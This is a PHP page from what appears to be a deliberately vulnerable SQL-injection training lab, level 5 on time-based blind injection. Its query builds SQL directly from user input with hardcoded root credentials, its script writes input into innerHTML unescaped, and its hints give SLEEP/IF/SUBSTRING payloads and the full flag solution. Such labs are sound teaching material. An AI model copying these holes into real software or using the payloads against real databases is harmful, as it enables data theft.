<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Level 5 - Time Based Blind SQLi</title>
    <link rel="stylesheet" href="css/styles.css">
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>⏰ Level 5 - Time Based Blind Injection</h1>
            <p><strong>Attack Type:</strong> Extract data by causing intentional delays in database response time</p>
        </div>

        <div class="form-container">
            <h3>Current Query:</h3>
            <div class="code-block">SELECT username FROM users WHERE username = '<?php echo htmlspecialchars($_GET['cond'] ?? 'NULL'); ?>'</div>
            
            <?php
            if (isset($_GET['cond'])) {
                echo '<h3>Result:</h3>';
                echo '<div class="result">';
                
                $mysqli = new mysqli('db','root','rootpassword','sqli_lab');
                $cond = $_GET['cond'];
                $sql = "SELECT username FROM users WHERE username = '$cond'";
                $start = microtime(true);
                $mysqli->query($sql);
                $delta = microtime(true) - $start;
                
                echo '<strong>⏱️ Query execution time:</strong> ' . number_format($delta, 4) . ' seconds';
                if ($delta > 2) {
                    echo ' <span style="color: #dc3545;">(DELAY DETECTED!)</span>';
                }
                echo '</div>';
            }
            ?>
            
            <h3>🔧 Try Your Own Payload:</h3>
            <form method="get" style="margin: 20px 0;">
                <div class="form-group">
                    <label for="cond">Username Condition:</label>
                    <input type="text" id="cond" name="cond" value="<?php echo htmlspecialchars($_GET['cond'] ?? ''); ?>" placeholder="Enter your payload here..." oninput="updateQuery()">
                </div>
                <button type="submit" class="btn">🚀 Execute Query</button>
            </form>

            <div class="hint-container">
                <button onclick="showNextHint()" class="btn hint-btn">💡 Get Hint</button>
                <div id="hint-1" class="hint-box" style="display: none;">
                    <h4>💡 Hint 1: Understanding Time-Based Blind Injection</h4>
                    <p>In time-based blind injection, we can't see the output directly, but we can measure how long the query takes to execute.</p>
                    <p>If a condition is true, we can make the database wait (sleep) for a few seconds.</p>
                </div>
                <div id="hint-2" class="hint-box" style="display: none;">
                    <h4>💡 Hint 2: Using SLEEP Function</h4>
                    <p>MySQL has a SLEEP() function that pauses execution for a specified number of seconds.</p>
                    <p>Try testing with: <code>alice' AND SLEEP(3)--</code></p>
                    <p>This should cause a 3-second delay if the injection works.</p>
                </div>
                <div id="hint-3" class="hint-box" style="display: none;">
                    <h4>💡 Hint 3: Conditional Time Delays</h4>
                    <p>We can use IF statements to create conditional delays based on data in the database.</p>
                    <p>Try: <code>alice' AND IF((SELECT COUNT(*) FROM levels WHERE id=5)>0,SLEEP(3),0)--</code></p>
                    <p>This will sleep for 3 seconds if level 5 exists in the levels table.</p>
                </div>
                <div id="hint-4" class="hint-box" style="display: none;">
                    <h4>💡 Hint 4: Character-by-Character Extraction</h4>
                    <p>We can extract data one character at a time using SUBSTRING and conditional delays.</p>
                    <p>Try: <code>alice' AND IF(SUBSTRING((SELECT flag FROM levels WHERE id=5),1,1)='F',SLEEP(3),0)--</code></p>
                    <p>This checks if the first character of the flag is 'F' and sleeps if true.</p>
                </div>
                <div id="hint-5" class="hint-box" style="display: none;">
                    <h4>🎯 Final Payload - Complete Solution</h4>
                    <p>Here's the complete payload to extract the flag:</p>
                    <p><code>alice' AND IF((SELECT flag FROM levels WHERE id=5)='FLAG{time_based_blind_success}',SLEEP(3),0)--</code></p>
                    <p>Or use this to extract character by character:</p>
                    <p><code>alice' AND IF(SUBSTRING((SELECT flag FROM levels WHERE id=5),1,1)='F',SLEEP(3),0)--</code></p>
                </div>
            </div>
        </div>
        
        <div class="navigation">
            <a href="index.php">🏠 Home</a>
            <a href="level4.php">⬅️ Previous Level</a>
            <a href="level6.php">➡️ Next Level</a>
            <a href="submit.php?level=5">🏆 Submit Flag</a>
        </div>
    </div>

    <script>
    let currentHint = 0;
    const maxHints = 5;

    function updateQuery() {
        const input = document.getElementById('cond').value;
        const codeBlock = document.querySelector('.code-block');
        codeBlock.innerHTML = "SELECT username FROM users WHERE username = '" + (input || 'NULL') + "'";
    }

    function showNextHint() {
        if (currentHint < maxHints) {
            currentHint++;
            document.getElementById('hint-' + currentHint).style.display = 'block';
            
            if (currentHint >= maxHints) {
                document.querySelector('.hint-btn').style.display = 'none';
            }
        }
    }
    </script>

    <style>
    .hint-container {
        margin: 20px 0;
    }
    .hint-box {
        margin: 15px 0;
        padding: 15px;
        background: #f8f9fa;
        border-radius: 8px;
        border-left: 4px solid #6c757d;
    }
    .hint-btn {
        margin-bottom: 10px;
    }
    </style>
</body>
</html>